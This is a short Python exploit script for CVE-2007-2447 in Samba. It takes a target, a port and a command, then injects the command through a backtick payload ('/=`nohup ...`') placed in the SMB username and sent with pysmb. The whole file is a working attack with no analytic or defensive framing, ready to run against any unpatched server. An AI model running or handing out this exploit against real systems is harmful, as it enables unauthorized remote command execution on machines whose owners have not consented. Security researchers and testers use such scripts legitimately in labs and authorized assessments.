# CVE-2007-2447 - RCE in Samba

import getopt
import sys 
from smb import SMBConnection


def usage():
    print('CVE-2007-2447 - RCE In Samba 2.0.20 < 3.0.25rc3')
    print()
    print('Flags:')
    print('{} - Target Host'.format('\t-t --target'.ljust(20,' ')))
    print('{} - Target Port'.format('\t-p --port'.ljust(20,' ')))
    print('{} - Command to execute'.format('\t-c --cmd'.ljust(20,' ')))
    print()    


def main():
    try:
        opts,args = getopt.getopt(sys.argv[1:],'t:p:c:',['target','port','cmd'])
    except getopt.GetoptError as e:
        print(str(e))
        usage()
        sys.exit(1)
    target = None
    port = None
    cmd = None
    for o,a in opts:
        if o in ('-t','--target'):
            target = a
        elif o in ('-p','--port'):
            try:
                port = int(a)
            except ValueError:
                print('[!] Invalid port provided, must be an int')
                usage()
                sys.exit(1)
        elif o in ('-c','--cmd'):
            cmd = a
        else:
            print('[!] Invalid option {} with value: {}'.format(o,a))
            usage()
            sys.exit(1)
   
    missing_param = False

    if target is None:
        print('[!] Must provide target')
        missing_param = True

    if port is None:
        print('[!] Must provide port')
        missing_param = True

    if cmd is None:
        print('[!] Must provide command')
        missing_param = True
    
    if missing_param:
        usage()
        sys.exit(1)

    print('[+] Generating exploit') 
    exploit = '/=`nohup {}`'.format(cmd)

    c = SMBConnection.SMBConnection(exploit, '', '', '')

    try: 
        c.connect(target, port, timeout=1)
    except:
        print('[+] Exploit sent')


if __name__ == '__main__':
    main()
